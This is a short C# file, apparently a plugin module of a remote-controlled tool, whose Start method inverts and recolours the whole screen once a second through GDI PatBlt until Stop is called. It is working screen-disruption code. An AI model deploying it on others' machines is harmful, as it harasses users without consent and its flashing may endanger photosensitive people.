using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleInvertColor
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 1046272u, 65519u };
			Random random = new Random();
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				IntPtr hObject = NativeMethods.CreateSolidBrush(array[random.Next(array.Length)]);
				NativeMethods.SelectObject(dC, hObject);
				NativeMethods.PatBlt(dC, 0, 0, width, height, 5898313u);
				NativeMethods.DeleteObject(hObject);
				NativeMethods.DeleteDC(dC);
				Thread.Sleep(1000);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
